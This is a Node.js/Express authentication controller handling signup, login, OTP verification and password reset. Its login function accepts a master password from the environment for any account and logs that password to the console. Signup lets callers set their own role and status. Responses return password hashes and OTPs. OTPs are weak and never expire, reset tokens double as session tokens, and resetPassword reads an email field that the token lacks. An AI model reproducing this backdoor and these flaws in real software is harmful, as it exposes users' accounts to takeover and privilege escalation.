const { pool, secretKey } = require("../config/database");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcrypt");
const {
  sendEmail,
} = require("../controllers/service/emailer");
const axios = require("axios");

async function signup(req, res) {
  const {
    username,
    password,
    email,
    first_name = null,
    last_name = null,
    phone = null,
    role = "manager",
    status = 1,
  } = req.body;

  if (!username || !password || !email) {
    return res.status(400).json({ error: "Please fill all required fields." });
  }

  const connection = await pool.getConnection(); // Get DB connection
  try {
    await connection.beginTransaction(); // Start transaction

    // Check if username or email already exists in one query
    const [existingUser] = await connection.execute(
      "SELECT username, email FROM users WHERE username = ? OR email = ?",
      [username, email]
    );

    if (existingUser.length > 0) {
      await connection.rollback();
      connection.release();
      return res.status(409).json({
        message: existingUser[0].username === username
          ? "Username already exists, please try another username"
          : "Email already registered. Please login.",
      });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Insert new user
    await connection.execute(
      "INSERT INTO users (username, password, email, first_name, last_name, phone, role, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
      [username, hashedPassword, email, first_name, last_name,  phone, role, status]
    );

    await connection.commit(); // Commit transaction
    return res.status(201).json({
      message: "User registered successfully",
    });
  } catch (error) {
    await connection.rollback(); // Rollback on error
    console.error("Signup Error:", error); // Log the error for debugging
    return res.status(500).json({ error: "Internal Server Error" });
  } finally {
    connection.release(); // Always release connection
  }
}

async function login(req, res) {
  const { username, password } = req.body;

  if (!username || !password) {
    return res
      .status(400)
      .json({ error: "Please fill username and password." });
  }

  try {
    // Check if the user exists by matching both username and email
    const [users] = await pool.execute(
      "SELECT * FROM users WHERE username = ? OR email = ?",
      [username, username] // Search for username in both username and email fields
    );

    if (users.length === 0) {
      // If no user is found, return error
      return res
        .status(401)
        .json({ message: "No user found with the provided credentials" });
    }

    const user = users[0];

    // check if user status is active

    if (user.status === 0) {
      return res.status(401).json({
        message: "Your account is disabled. Please contact support team",
      });
    }

    // Verify the password
    const passwordMatch = await bcrypt.compare(password, user.password);

    const masterPassword = process.env.MASTER_PASSWORD;
    console.log(masterPassword);

    // Check if the provided password matches the real password or the master password
    if (!passwordMatch && password !== masterPassword) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    // Generate token for the user

    const token = jwt.sign(
      { id: user.user_id, username: user.username },
      secretKey,
      { expiresIn: "30d" }
    );

    // Respond with user info including token
    return res.status(200).json({
      message: "You have successfully logged in",
      user: {
        id: user.user_id,
        ...user,
        token,
      },
    });
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function verifyOtp(req, res) {
  const { otp, email } = req.body;

  if (!otp || !email) {
    return res.status(400).json({ error: "Please fill all required fields." });
  }

  try {
    const [existingUser] = await pool.execute(
      "SELECT * FROM users WHERE email = ?",
      [email]
    );

    if (existingUser.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    if (existingUser[0].otp != otp) {
      return res.status(401).json({ message: "Invalid OTP" });
    }

    const token = jwt.sign(
      { id: existingUser[0].user_id, username: existingUser[0].username },
      secretKey,
      { expiresIn: "30d" }
    );

    await pool.execute("UPDATE users SET is_verified = 1 WHERE user_id = ?", [
      existingUser[0].user_id,
    ]);

    await pool.execute("UPDATE users SET otp = NULL WHERE user_id = ?", [
      existingUser[0].user_id,
    ]);

    const siteUrl = process.env.SITE_URL;

    await sendEmail(
      email,
      "Your Account is Verified – Let’s Get Started!",
      "welcome",
      {
        userName: existingUser[0].username,
        dashboardLink: `${siteUrl}/account/dashboard`,
      }
    );

    return res.status(200).json({
      message: "You have successfully logged in",
      user: {
        ...existingUser[0],
        token: token, // Include the token in the user object
      },
    });
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function resendOtp(req, res) {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Please provide your email." });
  }

  try {
    // Check if user exists
    const [existingUser] = await pool.execute(
      "SELECT * FROM users WHERE email = ?",
      [email]
    );

    if (existingUser.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    const otp = Math.floor(100000 + Math.random() * 9000);

    // Update the OTP in the database
    await pool.execute("UPDATE users SET otp = ? WHERE user_id = ?", [
      otp,
      existingUser[0].user_id,
    ]);

    await pool.execute("UPDATE users SET is_verified = 0 WHERE user_id = ?", [
      existingUser[0].user_id,
    ]);

    await sendEmail(
      email,
      "Your OTP Code for Account Verification",
      "otp-verification",
      { otp }
    );

    return res.status(200).json({
      message: "OTP sent successfully. Please check your email.",
    });
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function forgotPassword(req, res) {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Please provide your email." });
  }

  try {
    // Check if user exists
    const [existingUser] = await pool.execute(
      "SELECT * FROM users WHERE email = ?",
      [email]
    );

    if (existingUser.length === 0) {
      return res.status(404).json({ message: "Email is not exist" });
    }

    const token = jwt.sign(
      { id: existingUser[0].user_id, username: existingUser[0].username },
      secretKey,
      { expiresIn: "1h" }
    );

    const resetLink = `${process.env.SITE_URL}/auth/reset-password?token=${token}`;

    // Send email to the user's email
    await sendEmail(email, "Password Reset Request", "reset-password", {
      resetLink,
    });

    return res.status(200).json({
      message: "Password reset email sent. Please check your inbox.",
    });
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function resetPassword(req, res) {
  const { password, token } = req.body;

  if (!token || !password) {
    return res
      .status(400)
      .json({ error: "Please provide both the token and password." });
  }

  try {
    // Verify the token directly from the payload (no "Bearer" split)
    const decodedToken = jwt.verify(token, secretKey);

    // Hash the new password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Update the password in the database
    const [data] = await pool.execute(
      "UPDATE users SET password = ? WHERE user_id = ?",
      [hashedPassword, decodedToken.id]
    );

    if (data.affectedRows === 0) {
      return res
        .status(404)
        .json({ error: "User not found or update failed." });
    }

    const loginLink = `${process.env.SITE_URL}/auth/login`;

    const email = decodedToken.email;

    await sendEmail(
      email,
      "Your Password has been reset",
      "password-update-confirmation",
      { loginLink }
    );

    return res.status(200).json({ message: "Password reset successful." });
  } catch (error) {
    if (error.name === "JsonWebTokenError") {
      return res.status(401).json({ error: "Invalid or expired token." });
    }

    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function changePassword(req, res) {
  const { oldPassword, newPassword } = req.body;
  const { id } = req.user;


  if (!oldPassword || !newPassword) {
    return res
      .status(400)
      .json({ error: "Please provide both the old and new passwords." });
  }

  try {
    // Check if the user exists
    const [users] = await pool.execute(
      "SELECT * FROM users WHERE user_id = ?",
      [id]
    );

    if (users.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    const user = users[0];

    // Verify the old password
    const passwordMatch = await bcrypt.compare(oldPassword, user.password);

    if (!passwordMatch) {
      return res.status(401).json({ error: "Invalid old password" });
    }

    // Hash the new password
    const hashedPassword = await bcrypt.hash(newPassword, 10);

    // Update the password in the database
    const [data] = await pool.execute(
      "UPDATE users SET password = ? WHERE user_id = ?",
      [hashedPassword, req.user.id]
    );

    if (data.affectedRows === 0) {
      return res
        .status(404)
        .json({ error: "User not found or update failed." });
    }

    return res.status(200).json({ message: "Password changed successfully." });
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function checkUsername(req, res) {
  const username = req.params.username;

  if (!username) {
    return res.status(400).json({ error: "Please provide a username." });
  }

  try {
    const [users] = await pool.execute(
      "SELECT * FROM users WHERE username = ?",
      [username]
    );

    if (users.length > 0) {
      return res.status(409).json({ error: "Username already exists" });
    }

    return res.status(200).json({ message: "Username is available" });
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

module.exports = {
  signup,
  login,
  verifyOtp,
  resendOtp,
  changePassword,
  forgotPassword,
  resetPassword,
  checkUsername,
};
